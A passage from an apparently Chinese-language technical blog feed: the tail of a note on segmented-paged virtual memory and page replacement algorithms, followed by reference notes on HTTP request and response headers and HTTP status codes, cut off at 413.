title="段页式调度"></a>段页式调度</h3><p>段页式虚拟存储器是段式虚拟存储器和页式虚拟存储器的结合。实存被等分成页。每个程序则先按逻辑结构分段，每段再按照实存的页大小分页，程序按页进行调入和调出操作，但可按段进行编程、保护和共享。它把程序按逻辑单位分段以后，再把每段分成固定大小的页。程序对主存的调入调出是按页面进行的，但它又可以按段实现共享和保护，兼备页式和段式的优点。缺点是在映象过程中需要多次查表。在段页式虚拟存储系统中，每道程序是通过一个段表和一组页表来进行定位的。段表中的每个表目对应一个段，每个表目有一个指向该段的页表起始地址及该段的控制保护信息。由页表指明该段各页在主存中的位置以及是否已装入、已修改等状态信息。如果有多个用户在机器上运行，多道程序的每一道需要一个基号,由它指明该道程序的段表起始地址。虚拟地址格式如下：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">　　基号 段号 页号 页内地址</span><br></pre></td></tr></table></figure><h2 id="变换算法"><a href="#变换算法" class="headerlink" title="变换算法"></a>变换算法</h2><p>虚拟存储器地址变换基本上有3种形虚拟存储器工作过程式：全联想变换、直接变换和组联想变换。任何逻辑空间页面能够变换到物理空间任何页面位置的方式称为全联想变换。每个逻辑空间页面只能变换到物理空间一个特定页面的方式称为直接变换。组联想变换是指各组之间是直接变换，而组内各页间则是全联想变换。替换规则用来确定替换主存中哪一部分，以便腾空部分主存，存放来自辅存要调入的那部分内容。常见的替换算法有4种。</p><ol><li>随机算法：用软件或硬件随机数产生器确定替换的页面。</li><li>先进先出：先调入主存的页面先替换。</li><li>近期最少使用算法（LRU，Least Recently Used）：替换最长时间不用的页面。</li><li>最优算法：替换最长时间以后才使用的页面。这是理想化的算法，只能作为衡量其他各种算法优劣的标准。</li></ol><p>虚拟存储器的效率是系统性能评价的重要内容，它与主存容量、页面大小、命中率，程序局部性和替换算法等因素有关。</p>]]></content>
      <categories>
        <category>Knowledge</category>
        <category>Study</category>
      </categories>
  </entry>
  <entry>
    <title>后台开发笔记</title>
    <url>/2019/03/29/2019-03-29-BackgroundDevelopmentNotes/</url>
    <content><![CDATA[<h1 id="http-header"><a href="#http-header" class="headerlink" title="http header"></a>http header</h1><h2 id="General部分"><a href="#General部分" class="headerlink" title="General部分"></a>General部分</h2><table><thead><tr><th>Header</th><th>解释</th><th>示例</th></tr></thead><tbody><tr><td>Request URL</td><td>请求的url</td><td><a href="https://www.baidu.com/home/msg/data/personalcontent?callback=jQuery1" target="_blank" rel="noopener">https://www.baidu.com/home/msg/data/personalcontent?callback=jQuery1</a></td></tr><tr><td>Request Method</td><td>请求的方法，可以是GET、POST</td><td>GET</td></tr><tr><td>Status Code</td><td><a href="#statusCode">HTTP 状态码</a>，表示请求成功</td><td>200 OK</td></tr><tr><td>Remote Address</td><td>远程IP地址</td><td>119.75.213.61:443</td></tr><tr><td>Referrer Policy</td><td>见下文</td><td>unsafe-url</td></tr></tbody></table><h3 id="Referrer-Policy-States"><a href="#Referrer-Policy-States" class="headerlink" title="Referrer Policy States"></a>Referrer Policy States</h3><p>新的Referrer规定了五种策略：</p><ul><li>No Referrer：任何情况下都不发送Referrer信息</li><li>No Referrer When Downgrade：仅当协议降级（如HTTPS页面引入HTTP资源）时不发送Referrer信息。是大部分浏览器默认策略。</li><li>Origin Only：发送只包含host部分的referrer.</li><li>Origin When Cross-origin：仅在发生跨域访问时发送只包含host的Referer，同域下还是完整的。与Origin Only的区别是多判断了是否Cross-origin。协议、域名和端口都一致，浏览器才认为是同域。</li><li>Unsafe URL：全部都发送Referrer信息。最宽松最不安全的策略。</li></ul><h2 id="Requests部分"><a href="#Requests部分" class="headerlink" title="Requests部分"></a>Requests部分</h2><table><thead><tr><th>Header</th><th>解释</th><th>示例</th></tr></thead><tbody><tr><td>Accept</td><td>指定客户端能够接收的内容类型</td><td>Accept: text/plain, text/html</td></tr><tr><td>Accept-Charset</td><td>浏览器可以接受的字符编码集。</td><td>Accept-Charset: iso-8859-5</td></tr><tr><td>Accept-Encoding</td><td>指定浏览器可以支持的web服务器返回内容压缩编码类型。</td><td>Accept-Encoding: compress, gzip</td></tr><tr><td>Accept-Language</td><td>浏览器可接受的语言</td><td>Accept-Language: en,zh</td></tr><tr><td>Accept-Ranges</td><td>可以请求网页实体的一个或者多个子范围字段</td><td>Accept-Ranges: bytes</td></tr><tr><td>Authorization</td><td>HTTP授权的授权证书</td><td>Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</td></tr><tr><td>Cache-Control</td><td>指定请求和响应遵循的缓存机制</td><td>Cache-Control: no-cache</td></tr><tr><td>Connection</td><td>表示是否需要持久连接。（HTTP 1.1默认进行持久连接）</td><td>Connection: close</td></tr><tr><td>Cookie</td><td>HTTP请求发送时，会把保存在该请求域名下的所有cookie值一起发送给web服务器。</td><td>Cookie: $Version=1; Skin=new;</td></tr><tr><td>Content-Length</td><td>请求的内容长度</td><td>Content-Length: 348</td></tr><tr><td>Content-Type</td><td>请求的与实体对应的MIME信息</td><td>Content-Type: application/x-www-form-urlencoded</td></tr><tr><td>Date</td><td>请求发送的日期和时间</td><td>Date: Tue, 15 Nov 2010 08:12:31 GMT</td></tr><tr><td>Expect</td><td>请求的特定的服务器行为</td><td>Expect: 100-continue</td></tr><tr><td>From</td><td>发出请求的用户的Email</td><td>From: <a href="mailto:user@email.com">user@email.com</a></td></tr><tr><td>Host</td><td>指定请求的服务器的域名和端口号</td><td>Host: <a href="http://www.zcmhi.com" target="_blank" rel="noopener">www.zcmhi.com</a></td></tr><tr><td>If-Match</td><td>只有请求内容与实体相匹配才有效</td><td>If-Match: “737060cd8c284d8af7ad3082f209582d”</td></tr><tr><td>If-Modified-Since</td><td>如果请求的部分在指定时间之后被修改则请求成功，未被修改则返回304代码</td><td>If-Modified-Since: Sat, 29 Oct 2010 19:43:31 GMT</td></tr><tr><td>If-None-Match</td><td>如果内容未改变返回304代码，参数为服务器先前发送的Etag，与服务器回应的Etag比较判断是否改变</td><td>If-None-Match: “737060cd8c284d8af7ad3082f209582d”</td></tr><tr><td>If-Range</td><td>如果实体未改变，服务器发送客户端丢失的部分，否则发送整个实体。参数也为Etag</td><td>If-Range: “737060cd8c284d8af7ad3082f209582d”</td></tr><tr><td>If-Unmodified-Since</td><td>只在实体在指定时间之后未被修改才请求成功</td><td>If-Unmodified-Since: Sat, 29 Oct 2010 19:43:31 GMT</td></tr><tr><td>Max-Forwards</td><td>限制信息通过代理和网关传送的时间</td><td>Max-Forwards: 10</td></tr><tr><td>Pragma</td><td>用来包含实现特定的指令</td><td>Pragma: no-cache</td></tr><tr><td>Proxy-Authorization</td><td>连接到代理的授权证书</td><td>Proxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</td></tr><tr><td>Range</td><td>只请求实体的一部分，指定范围</td><td>Range: bytes=500-999</td></tr><tr><td>Referer</td><td>先前网页的地址，当前请求网页紧随其后,即来路</td><td>Referer: <a href="http://www.zcmhi.com/archives/71.html" target="_blank" rel="noopener">http://www.zcmhi.com/archives/71.html</a></td></tr><tr><td>TE</td><td>客户端愿意接受的传输编码，并通知服务器接受接受尾加头信息</td><td>TE: trailers,deflate;q=0.5</td></tr><tr><td>Upgrade</td><td>向服务器指定某种传输协议以便服务器进行转换（如果支持）</td><td>Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11</td></tr><tr><td>User-Agent</td><td>User-Agent的内容包含发出请求的用户信息</td><td>User-Agent: Mozilla/5.0 (Linux; X11)</td></tr><tr><td>Via</td><td>通知中间网关或代理服务器地址，通信协议</td><td>Via: 1.0 fred, 1.1 nowhere.com (Apache/1.1)</td></tr><tr><td>Warning</td><td>关于消息实体的警告信息</td><td>Warn: 199 Miscellaneous warning</td></tr></tbody></table><h2 id="Responses-部分"><a href="#Responses-部分" class="headerlink" title="Responses 部分"></a>Responses 部分</h2><table><thead><tr><th>Header</th><th>解释</th><th>示例</th></tr></thead><tbody><tr><td>Accept-Ranges</td><td>表明服务器是否支持指定范围请求及哪种类型的分段请求</td><td>Accept-Ranges: bytes</td></tr><tr><td>Age</td><td>从原始服务器到代理缓存形成的估算时间（以秒计，非负）</td><td>Age: 12</td></tr><tr><td>Allow</td><td>对某网络资源的有效的请求行为，不允许则返回405</td><td>Allow: GET, HEAD</td></tr><tr><td>Cache-Control</td><td>告诉所有的缓存机制是否可以缓存及哪种类型</td><td>Cache-Control: no-cache</td></tr><tr><td>Content-Encoding</td><td>web服务器支持的返回内容压缩编码类型。</td><td>Content-Encoding: gzip</td></tr><tr><td>Content-Language</td><td>响应体的语言</td><td>Content-Language: en,zh</td></tr><tr><td>Content-Length</td><td>响应体的长度</td><td>Content-Length: 348</td></tr><tr><td>Content-Location</td><td>请求资源可替代的备用的另一地址</td><td>Content-Location: /index.htm</td></tr><tr><td>Content-MD5</td><td>返回资源的MD5校验值</td><td>Content-MD5: Q2hlY2sgSW50ZWdyaXR5IQ==</td></tr><tr><td>Content-Range</td><td>在整个返回体中本部分的字节位置</td><td>Content-Range: bytes 21010-47021/47022</td></tr><tr><td>Content-Type</td><td>返回内容的MIME类型</td><td>Content-Type: text/html; charset=utf-8</td></tr><tr><td>Date</td><td>原始服务器消息发出的时间</td><td>Date: Tue, 15 Nov 2010 08:12:31 GMT</td></tr><tr><td>ETag</td><td>请求变量的实体标签的当前值</td><td>ETag: “737060cd8c284d8af7ad3082f209582d”</td></tr><tr><td>Expires</td><td>响应过期的日期和时间</td><td>Expires: Thu, 01 Dec 2010 16:00:00 GMT</td></tr><tr><td>Last-Modified</td><td>请求资源的最后修改时间</td><td>Last-Modified: Tue, 15 Nov 2010 12:45:26 GMT</td></tr><tr><td>Location</td><td>用来重定向接收方到非请求URL的位置来完成请求或标识新的资源</td><td>Location: <a href="http://www.zcmhi.com/archives/94.html" target="_blank" rel="noopener">http://www.zcmhi.com/archives/94.html</a></td></tr><tr><td>Pragma</td><td>包括实现特定的指令，它可应用到响应链上的任何接收方</td><td>Pragma: no-cache</td></tr><tr><td>Proxy-Authenticate</td><td>它指出认证方案和可应用到代理的该URL上的参数</td><td>Proxy-Authenticate: Basic</td></tr><tr><td>refresh</td><td>应用于重定向或一个新的资源被创造，在5秒之后重定向（由网景提出，被大部分浏览器支持）</td><td>Refresh: 5; url=<a href="http://www.zcmhi.com/archives/94.html" target="_blank" rel="noopener">http://www.zcmhi.com/archives/94.html</a></td></tr><tr><td>Retry-After</td><td>如果实体暂时不可取，通知客户端在指定时间之后再次尝试</td><td>Retry-After: 120</td></tr><tr><td>Server</td><td>web服务器软件名称</td><td>Server: Apache/1.3.27 (Unix) (Red-Hat/Linux)</td></tr><tr><td>Set-Cookie</td><td>设置Http Cookie</td><td>Set-Cookie: UserID=JohnDoe; Max-Age=3600; Version=1</td></tr><tr><td>Trailer</td><td>指出头域在分块传输编码的尾部存在</td><td>Trailer: Max-Forwards</td></tr><tr><td>Transfer-Encoding</td><td>文件传输编码</td><td>Transfer-Encoding:chunked</td></tr><tr><td>Vary</td><td>告诉下游代理是使用缓存响应还是从原始服务器请求</td><td>Vary: *</td></tr><tr><td>Via</td><td>告知代理客户端响应是通过哪里发送的</td><td>Via: 1.0 fred, 1.1 nowhere.com (Apache/1.1)</td></tr><tr><td>Warning</td><td>警告实体可能存在的问题</td><td>Warning: 199 Miscellaneous warning</td></tr><tr><td>WWW-Authenticate</td><td>表明客户端请求实体应该使用的授权方案</td><td>WWW-Authenticate: Basic</td></tr></tbody></table><h1 id="http状态码记录"><a href="#http状态码记录" class="headerlink" title="http状态码记录"></a><span id="statusCode">http状态码记录</span></h1><h2 id="1xx-消息"><a href="#1xx-消息" class="headerlink" title="1xx 消息"></a>1xx 消息</h2><p>这一类型的状态码，代表请求已被接受，需要继续处理。这类响应是临时响应，只包含状态行和某些可选的响应头信息，并以空行结束。由于 HTTP/1.0 协议中没有定义任何 1xx 状态码，所以除非在某些试验条件下，服务器禁止向此类客户端发送 1xx 响应。</p><h3 id="100-Continue"><a href="#100-Continue" class="headerlink" title="100 Continue"></a>100 Continue</h3><p>客户端应当继续发送请求。这个临时响应是用来通知客户端它的部分请求已经被服务器接收，且仍未被拒绝。客户端应当继续发送请求的剩余部分，或者如果请求已经完成，忽略这个响应。服务器必须在请求完成后向客户端发送一个最终响应。</p><h3 id="101-Switching-Protocols"><a href="#101-Switching-Protocols" class="headerlink" title="101 Switching Protocols"></a>101 Switching Protocols</h3><p>服务器已经理解了客户端的请求，并将通过Upgrade 消息头通知客户端采用不同的协议来完成这个请求。在发送完这个响应最后的空行后，服务器将会切换到在Upgrade 消息头中定义的那些协议。</p><p>只有在切换新的协议更有好处的时候才应该采取类似措施。例如，切换到新的HTTP 版本比旧版本更有优势，或者切换到一个实时且同步的协议以传送利用此类特性的资源。</p><h3 id="102-Processing"><a href="#102-Processing" class="headerlink" title="102 Processing"></a>102 Processing</h3><p>由WebDAV（RFC 2518）扩展的状态码，代表处理将被继续执行。</p><h2 id="2xx-成功"><a href="#2xx-成功" class="headerlink" title="2xx 成功"></a>2xx 成功</h2><p>这一类型的状态码，代表请求已成功被服务器接收、理解、并接受。</p><h3 id="200-OK"><a href="#200-OK" class="headerlink" title="200 OK"></a>200 OK</h3><p>请求已成功，请求所希望的响应头或数据体将随此响应返回。出现此状态码是表示正常状态。</p><h3 id="201-Created"><a href="#201-Created" class="headerlink" title="201 Created"></a>201 Created</h3><p>请求已经被实现，而且有一个新的资源已经依据请求的需要而建立，且其 URI 已经随Location 头信息返回。假如需要的资源无法及时建立的话，应当返回 ‘202 Accepted’。</p><h3 id="202-Accepted"><a href="#202-Accepted" class="headerlink" title="202 Accepted"></a>202 Accepted</h3><p>服务器已接受请求，但尚未处理。正如它可能被拒绝一样，最终该请求可能会也可能不会被执行。在异步操作的场合下，没有比发送这个状态码更方便的做法了。</p><p>返回202状态码的响应的目的是允许服务器接受其他过程的请求（例如某个每天只执行一次的基于批处理的操作），而不必让客户端一直保持与服务器的连接直到批处理操作全部完成。在接受请求处理并返回202状态码的响应应当在返回的实体中包含一些指示处理当前状态的信息，以及指向处理状态监视器或状态预测的指针，以便用户能够估计操作是否已经完成。</p><h3 id="203-Non-Authoritative-Information"><a href="#203-Non-Authoritative-Information" class="headerlink" title="203 Non-Authoritative Information"></a>203 Non-Authoritative Information</h3><p>服务器已成功处理了请求，但返回的实体头部元信息不是在原始服务器上有效的确定集合，而是来自本地或者第三方的拷贝。当前的信息可能是原始版本的子集或者超集。例如，包含资源的元数据可能导致原始服务器知道元信息的超集。使用此状态码不是必须的，而且只有在响应不使用此状态码便会返回200 OK的情况下才是合适的。</p><h3 id="204-No-Content"><a href="#204-No-Content" class="headerlink" title="204 No Content"></a>204 No Content</h3><p>服务器成功处理了请求，但不需要返回任何实体内容，并且希望返回更新了的元信息。响应可能通过实体头部的形式，返回新的或更新后的元信息。如果存在这些头部信息，则应当与所请求的变量相呼应。</p><p>如果客户端是浏览器的话，那么用户浏览器应保留发送了该请求的页面，而不产生任何文档视图上的变化，即使按照规范新的或更新后的元信息应当被应用到用户浏览器活动视图中的文档。</p><p>由于204响应被禁止包含任何消息体，因此它始终以消息头后的第一个空行结尾。</p><h3 id="205-Reset-Content"><a href="#205-Reset-Content" class="headerlink" title="205 Reset Content"></a>205 Reset Content</h3><p>服务器成功处理了请求，且没有返回任何内容。但是与204响应不同，返回此状态码的响应要求请求者重置文档视图。该响应主要是被用于接受用户输入后，立即重置表单，以便用户能够轻松地开始另一次输入。</p><p>与204响应一样，该响应也被禁止包含任何消息体，且以消息头后的第一个空行结束。</p><h3 id="206-Partial-Content"><a href="#206-Partial-Content" class="headerlink" title="206 Partial Content"></a>206 Partial Content</h3><p>服务器已经成功处理了部分 GET 请求。类似于 FlashGet 或者迅雷这类的 HTTP下载工具都是使用此类响应实现断点续传或者将一个大文档分解为多个下载段同时下载。</p><p>该请求必须包含 Range 头信息来指示客户端希望得到的内容范围，并且可能包含 If-Range 来作为请求条件。</p><p>响应必须包含如下的头部域：</p><ul><li>Content-Range 用以指示本次响应中返回的内容的范围；如果是 Content-Type 为 multipart/byteranges 的多段下载，则每一 multipart 段中都应包含 Content-Range 域用以指示本段的内容范围。假如响应中包含 Content-Length，那么它的数值必须匹配它返回的内容范围的真实字节数。</li><li>Date</li><li>ETag 和/或 Content-Location，假如同样的请求本应该返回200响应。</li><li>Expires, Cache-Control，和/或 Vary，假如其值可能与之前相同变量的其他响应对应的值不同的话。<br>假如本响应请求使用了 If-Range 强缓存验证，那么本次响应不应该包含其他实体头；假如本响应的请求使用了 If-Range 弱缓存验证，那么本次响应禁止包含其他实体头；这避免了缓存的实体内容和更新了的实体头信息之间的不一致。否则，本响应就应当包含所有本应该返回200响应中应当返回的所有实体头部域。</li></ul><p>假如 ETag 或 Last-Modified 头部不能精确匹配的话，则客户端缓存应禁止将206响应返回的内容与之前任何缓存过的内容组合在一起。</p><h3 id="207-Multi-Status"><a href="#207-Multi-Status" class="headerlink" title="207 Multi-Status"></a>207 Multi-Status</h3><p>由WebDAV(RFC 2518)扩展的状态码，代表之后的消息体将是一个XML消息，并且可能依照之前子请求数量的不同，包含一系列独立的响应代码。</p><h2 id="3xx-重定向"><a href="#3xx-重定向" class="headerlink" title="3xx 重定向"></a>3xx 重定向</h2><p>这类状态码代表需要客户端采取进一步的操作才能完成请求。通常，这些状态码用来重定向，后续的请求地址（重定向目标）在本次响应的 Location 域中指明。</p><p>当且仅当后续的请求所使用的方法是 GET 或者 HEAD 时，用户浏览器才可以在没有用户介入的情况下自动提交所需要的后续请求。客户端应当自动监测无限循环重定向（例如：A-&gt;A，或者A-&gt;B-&gt;C-&gt;A），因为这会导致服务器和客户端大量不必要的资源消耗。按照 HTTP/1.0 版规范的建议，浏览器不应自动访问超过5次的重定向。</p><h3 id="300-Multiple-Choices"><a href="#300-Multiple-Choices" class="headerlink" title="300 Multiple Choices"></a>300 Multiple Choices</h3><p>被请求的资源有一系列可供选择的回馈信息，每个都有自己特定的地址和浏览器驱动的商议信息。用户或浏览器能够自行选择一个首选的地址进行重定向。</p><p>除非这是一个 HEAD 请求，否则该响应应当包括一个资源特性及地址的列表的实体，以便用户或浏览器从中选择最合适的重定向地址。这个实体的格式由 Content-Type 定义的格式所决定。浏览器可能根据响应的格式以及浏览器自身能力，自动作出最合适的选择。当然，RFC 2616规范并没有规定这样的自动选择该如何进行。</p><p>如果服务器本身已经有了首选的回馈选择，那么在 Location 中应当指明这个回馈的 URI；浏览器可能会将这个 Location 值作为自动重定向的地址。此外，除非额外指定，否则这个响应也是可缓存的。</p><h3 id="301-Moved-Permanently"><a href="#301-Moved-Permanently" class="headerlink" title="301 Moved Permanently"></a>301 Moved Permanently</h3><p>被请求的资源已永久移动到新位置，并且将来任何对此资源的引用都应该使用本响应返回的若干个 URI 之一。如果可能，拥有链接编辑功能的客户端应当自动把请求的地址修改为从服务器反馈回来的地址。除非额外指定，否则这个响应也是可缓存的。</p><p>新的永久性的URI 应当在响应的 Location 域中返回。除非这是一个 HEAD 请求，否则响应的实体中应当包含指向新的 URI 的超链接及简短说明。</p><p>如果这不是一个 GET 或者 HEAD 请求，因此浏览器禁止自动进行重定向，除非得到用户的确认，因为请求的条件可能因此发生变化。</p><p>注意：对于某些使用 HTTP/1.0 协议的浏览器，当它们发送的 POST 请求得到了一个301响应的话，接下来的重定向请求将会变成 GET 方式。</p><h3 id="302-Move-temporarily"><a href="#302-Move-temporarily" class="headerlink" title="302 Move temporarily"></a>302 Move temporarily</h3><p>请求的资源临时从不同的 URI响应请求。由于这样的重定向是临时的，客户端应当继续向原有地址发送以后的请求。只有在Cache-Control或Expires中进行了指定的情况下，这个响应才是可缓存的。<br>上文有提及。</p><p>如果这不是一个 GET 或者 HEAD 请求，那么浏览器禁止自动进行重定向，除非得到用户的确认，因为请求的条件可能因此发生变化。</p><p>注意：虽然RFC 1945和RFC 2068规范不允许客户端在重定向时改变请求的方法，但是很多现存的浏览器将302响应视作为303响应，并且使用 GET 方式访问在 Location 中规定的 URI，而无视原先请求的方法。状态码303和307被添加了进来，用以明确服务器期待客户端进行何种反应。</p><h3 id="303-See-Other"><a href="#303-See-Other" class="headerlink" title="303 See Other"></a>303 See Other</h3><p>对应当前请求的响应可以在另一个 URL 上被找到，而且客户端应当采用 GET 的方式访问那个资源。这个方法的存在主要是为了允许由脚本激活的POST请求输出重定向到一个新的资源。这个新的 URI 不是原始资源的替代引用。同时，303响应禁止被缓存。当然，第二个请求（重定向）可能被缓存。</p><p>注意：许多 HTTP/1.1 版以前的浏览器不能正确理解303状态。如果需要考虑与这些浏览器之间的互动，302状态码应该可以胜任，因为大多数的浏览器处理302响应时的方式恰恰就是上述规范要求客户端处理303响应时应当做的。</p><h3 id="304-Not-Modified"><a href="#304-Not-Modified" class="headerlink" title="304 Not Modified"></a>304 Not Modified</h3><p>如果客户端发送了一个带条件的 GET 请求且该请求已被允许，而文档的内容（自上次访问以来或者根据请求的条件）并没有改变，则服务器应当返回这个状态码。304响应禁止包含消息体，因此始终以消息头后的第一个空行结尾。</p><p>该响应必须包含以下的头信息：</p><ul><li>Date，除非这个服务器没有时钟。假如没有时钟的服务器也遵守这些规则，那么代理服务器以及客户端可以自行将 Date 字段添加到接收到的响应头中去（正如RFC 2068中规定的一样），缓存机制将会正常工作。</li><li>ETag 和/或 Content-Location，假如同样的请求本应返回200响应。</li><li>Expires, Cache-Control，和/或Vary，假如其值可能与之前相同变量的其他响应对应的值不同的话。<br>假如本响应请求使用了强缓存验证，那么本次响应不应该包含其他实体头；否则（例如，某个带条件的 GET 请求使用了弱缓存验证），本次响应禁止包含其他实体头；这避免了缓存了的实体内容和更新了的实体头信息之间的不一致。</li></ul><p>假如某个304响应指明了当前某个实体没有缓存，那么缓存系统必须忽视这个响应，并且重复发送不包含限制条件的请求。</p><p>假如接收到一个要求更新某个缓存条目的304响应，那么缓存系统必须更新整个条目以反映所有在响应中被更新的字段的值。</p><h3 id="305-Use-Proxy"><a href="#305-Use-Proxy" class="headerlink" title="305 Use Proxy"></a>305 Use Proxy</h3><p>被请求的资源必须通过指定的代理才能被访问。Location 域中将给出指定的代理所在的 URI 信息，接收者需要重复发送一个单独的请求，通过这个代理才能访问相应资源。只有原始服务器才能建立305响应。</p><p>注意：RFC 2068中没有明确305响应是为了重定向一个单独的请求，而且只能被原始服务器建立。忽视这些限制可能导致严重的安全后果。</p><h3 id="306-Switch-Proxy"><a href="#306-Switch-Proxy" class="headerlink" title="306 Switch Proxy"></a>306 Switch Proxy</h3><p>在最新版的规范中，306状态码已经不再被使用。</p><h3 id="307-Temporary-Redirect"><a href="#307-Temporary-Redirect" class="headerlink" title="307 Temporary Redirect"></a>307 Temporary Redirect</h3><p>请求的资源临时从不同的URI 响应请求。</p><p>新的临时性的URI 应当在响应的 Location 域中返回。除非这是一个HEAD 请求，否则响应的实体中应当包含指向新的URI 的超链接及简短说明。因为部分浏览器不能识别307响应，因此需要添加上述必要信息以便用户能够理解并向新的 URI 发出访问请求。</p><p>如果这不是一个GET 或者 HEAD 请求，那么浏览器禁止自动进行重定向，除非得到用户的确认，因为请求的条件可能因此发生变化。</p><h2 id="4xx-请求错误"><a href="#4xx-请求错误" class="headerlink" title="4xx 请求错误"></a>4xx 请求错误</h2><p>这类的状态码代表了客户端看起来可能发生了错误，妨碍了服务器的处理。除非响应的是一个 HEAD 请求，否则服务器就应该返回一个解释当前错误状况的实体，以及这是临时的还是永久性的状况。这些状态码适用于任何请求方法。浏览器应当向用户显示任何包含在此类错误响应中的实体内容。</p><p>如果错误发生时客户端正在传送数据，那么使用TCP的服务器实现应当仔细确保在关闭客户端与服务器之间的连接之前，客户端已经收到了包含错误信息的数据包。如果客户端在收到错误信息后继续向服务器发送数据，服务器的TCP栈将向客户端发送一个重置数据包，以清除该客户端所有还未识别的输入缓冲，以免这些数据被服务器上的应用程序读取并干扰后者。</p><h3 id="400-Bad-Request"><a href="#400-Bad-Request" class="headerlink" title="400 Bad Request"></a>400 Bad Request</h3><ol><li>语义有误，当前请求无法被服务器理解。除非进行修改，否则客户端不应该重复提交这个请求。</li><li>请求参数有误。</li></ol><h3 id="401-Unauthorized"><a href="#401-Unauthorized" class="headerlink" title="401 Unauthorized"></a>401 Unauthorized</h3><p>当前请求需要用户验证。该响应必须包含一个适用于被请求资源的 WWW-Authenticate 信息头用以询问用户信息。客户端可以重复提交一个包含恰当的 Authorization 头信息的请求。如果当前请求已经包含了 Authorization 证书，那么401响应代表着服务器验证已经拒绝了那些证书。如果401响应包含了与前一个响应相同的身份验证询问，且浏览器已经至少尝试了一次验证，那么浏览器应当向用户展示响应中包含的实体信息，因为这个实体信息中可能包含了相关诊断信息。参见RFC 2617。</p><h3 id="402-Payment-Required"><a href="#402-Payment-Required" class="headerlink" title="402 Payment Required"></a>402 Payment Required</h3><p>该状态码是为了将来可能的需求而预留的。</p><h3 id="403-Forbidden"><a href="#403-Forbidden" class="headerlink" title="403 Forbidden"></a>403 Forbidden</h3><p>服务器已经理解请求，但是拒绝执行它。与401响应不同的是，身份验证并不能提供任何帮助，而且这个请求也不应该被重复提交。如果这不是一个 HEAD 请求，而且服务器希望能够讲清楚为何请求不能被执行，那么就应该在实体内描述拒绝的原因。当然服务器也可以返回一个404响应，假如它不希望让客户端获得任何信息。</p><h3 id="404-Not-Found"><a href="#404-Not-Found" class="headerlink" title="404 Not Found"></a>404 Not Found</h3><p>请求失败，请求所希望得到的资源未被在服务器上发现。没有信息能够告诉用户这个状况到底是暂时的还是永久的。假如服务器知道情况的话，应当使用410状态码来告知旧资源因为某些内部的配置机制问题，已经永久的不可用，而且没有任何可以跳转的地址。404这个状态码被广泛应用于当服务器不想揭示到底为何请求被拒绝或者没有其他适合的响应可用的情况下。出现这个错误的最有可能的原因是服务器端没有这个页面。</p><h3 id="405-Method-Not-Allowed"><a href="#405-Method-Not-Allowed" class="headerlink" title="405 Method Not Allowed"></a>405 Method Not Allowed</h3><p>请求行中指定的请求方法不能被用于请求相应的资源。该响应必须返回一个Allow 头信息用以表示出当前资源能够接受的请求方法的列表。</p><p>鉴于 PUT，DELETE 方法会对服务器上的资源进行写操作，因而绝大部分的网页服务器都不支持或者在默认配置下不允许上述请求方法，对于此类请求均会返回405错误。</p><h3 id="406-Not-Acceptable"><a href="#406-Not-Acceptable" class="headerlink" title="406 Not Acceptable"></a>406 Not Acceptable</h3><p>请求的资源的内容特性无法满足请求头中的条件，因而无法生成响应实体。</p><p>除非这是一个 HEAD 请求，否则该响应就应当返回一个包含可以让用户或者浏览器从中选择最合适的实体特性以及地址列表的实体。实体的格式由 Content-Type 头中定义的媒体类型决定。浏览器可以根据格式及自身能力自行作出最佳选择。但是，规范中并没有定义任何作出此类自动选择的标准。</p><h3 id="407-Proxy-Authentication-Required"><a href="#407-Proxy-Authentication-Required" class="headerlink" title="407 Proxy Authentication Required"></a>407 Proxy Authentication Required</h3><p>与401响应类似，只不过客户端必须在代理服务器上进行身份验证。代理服务器必须返回一个 Proxy-Authenticate 用以进行身份询问。客户端可以返回一个 Proxy-Authorization 信息头用以验证。参见RFC 2617。</p><h3 id="408-Request-Timeout"><a href="#408-Request-Timeout" class="headerlink" title="408 Request Timeout"></a>408 Request Timeout</h3><p>请求超时。客户端没有在服务器预备等待的时间内完成一个请求的发送。客户端可以随时再次提交这一请求而无需进行任何更改。</p><h3 id="409-Conflict"><a href="#409-Conflict" class="headerlink" title="409 Conflict"></a>409 Conflict</h3><p>由于和被请求的资源的当前状态之间存在冲突，请求无法完成。这个代码只允许用在这样的情况下才能被使用：用户被认为能够解决冲突，并且会重新提交新的请求。该响应应当包含足够的信息以便用户发现冲突的源头。</p><p>冲突通常发生于对 PUT 请求的处理中。例如，在采用版本检查的环境下，某次 PUT 提交的对特定资源的修改请求所附带的版本信息与之前的某个（第三方）请求向冲突，那么此时服务器就应该返回一个409错误，告知用户请求无法完成。此时，响应实体中很可能会包含两个冲突版本之间的差异比较，以便用户重新提交归并以后的新版本。</p><h3 id="410-Gone"><a href="#410-Gone" class="headerlink" title="410 Gone"></a>410 Gone</h3><p>被请求的资源在服务器上已经不再可用，而且没有任何已知的转发地址。这样的状况应当被认为是永久性的。如果可能，拥有链接编辑功能的客户端应当在获得用户许可后删除所有指向这个地址的引用。如果服务器不知道或者无法确定这个状况是否是永久的，那么就应该使用404状态码。除非额外说明，否则这个响应是可缓存的。</p><p>410响应的目的主要是帮助网站管理员维护网站，通知用户该资源已经不再可用，并且服务器拥有者希望所有指向这个资源的远端连接也被删除。这类事件在限时、增值服务中很普遍。同样，410响应也被用于通知客户端在当前服务器站点上，原本属于某个个人的资源已经不再可用。当然，是否需要把所有永久不可用的资源标记为’410 Gone’，以及是否需要保持此标记多长时间，完全取决于服务器拥有者。</p><h3 id="411-Length-Required"><a href="#411-Length-Required" class="headerlink" title="411 Length Required"></a>411 Length Required</h3><p>服务器拒绝在没有定义 Content-Length 头的情况下接受请求。在添加了表明请求消息体长度的有效 Content-Length 头之后，客户端可以再次提交该请求。</p><h3 id="412-Precondition-Failed"><a href="#412-Precondition-Failed" class="headerlink" title="412 Precondition Failed"></a>412 Precondition Failed</h3><p>服务器在验证在请求的头字段中给出先决条件时，没能满足其中的一个或多个。这个状态码允许客户端在获取资源时在请求的元信息（请求头字段数据）中设置先决条件，以此避免该请求方法被应用到其希望的内容以外的资源上。</p><h3 id="413-Request-Entity-Too-Large"><a href="#413-Request-Entity-Too-Large" class="headerlink" title="413 Request Entity Too Large"></a>413 Request Entity Too Large</h3><p>服务器拒绝处理当前请求，因为该请求提交的实体数据大小超过了服务器愿意或者能够处理的范围。此种情况下，服务器可以关闭连接以免客户端继续发送此请求。</p><p>如果这个状况是临时的，服务器应当返回一个 Retry-After 